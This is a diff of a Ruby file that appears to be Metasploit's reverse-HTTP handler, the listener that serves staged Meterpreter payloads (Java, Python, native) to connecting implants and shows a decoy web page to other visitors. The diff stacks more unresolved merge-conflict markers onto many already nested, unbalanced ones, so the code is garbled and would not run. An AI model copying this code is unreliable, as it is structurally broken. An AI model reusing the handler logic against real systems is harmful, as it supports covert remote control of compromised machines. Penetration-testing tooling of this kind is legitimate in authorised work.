@@ -23,6 +23,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   include Msf::Handler::Reverse
 =======
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
@@ -34,6 +35,8 @@ module ReverseHttp
 >>>>>>> origin/payload-generator.rb
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
   include Rex::Payloads::Meterpreter::UriChecksum
   include Msf::Payload::Windows::VerifySsl
 
@@ -66,6 +69,7 @@ module ReverseHttp
 
     register_advanced_options(
       [
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -116,6 +120,21 @@ module ReverseHttp
       ], Msf::Handler::ReverseHttp)
   end
 
+=======
+        OptString.new('ReverseListenerComm', [false, 'The specific communication channel to use for this listener']),
+        OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
+        OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
+        OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
+        OptInt.new('ReverseListenerBindPort', [false, 'The port to bind to on the local system if different from LPORT']),
+        OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
+        OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
+        OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
+        OptString.new('HttpUnknownRequestResponse', [false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>']),
+        OptBool.new('IgnoreUnknownPayloads', [false, 'Whether to drop connections from payloads using unknown UUIDs', false])
+      ], Msf::Handler::ReverseHttp)
+  end
+
+>>>>>>> origin/pod/metasploit-gemfile-
   # Determine where to bind the server
   #
   # @return [String]
@@ -134,6 +153,7 @@ module ReverseHttp
   # @return [String] A URI of the form +scheme://host:port/+
   def listener_uri
     uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -215,6 +235,9 @@ module ReverseHttp
     "#{scheme}://#{uri_host}:#{bind_port}/"
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
+>>>>>>> origin/pod/metasploit-gemfile-
   end
 
   # Return a URI suitable for placing in a payload.
@@ -233,8 +256,11 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/msf-complex-payloads
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
     end
 
     # Override the host and port as appropriate
@@ -247,6 +273,7 @@ module ReverseHttp
       callback_host = "#{callback_name}:#{callback_port}"
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
     end
@@ -278,6 +305,8 @@ module ReverseHttp
 >>>>>>> origin/payload-generator.rb
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
     "#{scheme}://#{callback_host}/"
   end
 
@@ -329,6 +358,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/4.11.2_release_pre-rails4
 =======
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
@@ -340,6 +370,8 @@ module ReverseHttp
 >>>>>>> origin/payload-generator.rb
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
       (ssl?) ? datastore['HandlerSSLCert'] : nil
     )
 
@@ -431,6 +463,7 @@ protected
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/msf-complex-payloads
 =======
@@ -465,6 +498,19 @@ protected
     end
 
 =======
+=======
+
+    # Configure the UUID architecture and payload if necessary
+    uuid.arch      ||= obj.arch
+    uuid.platform  ||= obj.platform
+
+    conn_id = nil
+    if info[:mode] && info[:mode] != :connect
+      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
+    end
+
+    request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"
+>>>>>>> origin/pod/metasploit-gemfile-
 
     # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
     if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
@@ -472,7 +518,10 @@ protected
       info[:mode] = :unknown_uuid
     end
 
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
     # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
     if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
       allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
@@ -481,6 +530,7 @@ protected
         info[:mode] = :unknown_uuid_url
       end
     end
+<<<<<<< HEAD
 <<<<<<< HEAD
 
 =======
@@ -557,6 +607,9 @@ protected
 =======
 
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+
+>>>>>>> origin/pod/metasploit-gemfile-
     self.pending_connections += 1
 
     # Process the requested resource.
@@ -564,6 +617,9 @@ protected
       when :init_connect
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection from #{request_summary}")
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 
         # Handle the case where stageless payloads call in on the same URI when they
         # first connect. From there, we tell them to callback on a connect URI that
@@ -581,6 +637,7 @@ protected
 
         blob = ""
         blob << obj.generate_stage(
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -680,6 +737,11 @@ protected
                                                  'core_patch_url')
         pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
         resp.body = pkt.to_r
+=======
+          uuid: uuid,
+          uri:  conn_id
+        )
+>>>>>>> origin/pod/metasploit-gemfile-
 
       when :init_python
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
@@ -761,6 +823,7 @@ protected
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 
       when :init_java
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
@@ -785,6 +848,13 @@ protected
 >>>>>>> origin/payload-generator.rb
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+
+      when :init_java
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
+        url = payload_uri(req) + conn_id + "/\x00"
+
+>>>>>>> origin/pod/metasploit-gemfile-
         blob = obj.generate_stage(
           uuid: uuid,
           uri:  conn_id
@@ -808,6 +878,7 @@ protected
       when :init_native
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -873,6 +944,8 @@ protected
         uri = URI(payload_uri(req) + conn_id)
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 
         resp['Content-Type'] = 'application/octet-stream'
 
@@ -881,6 +954,7 @@ protected
         blob = obj.stage_payload(
           uuid: uuid,
           uri:  conn_id,
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1014,6 +1088,10 @@ protected
           lport: uri.port
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
+          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
+>>>>>>> origin/pod/metasploit-gemfile-
         )
 
         resp.body = encode_stage(blob)
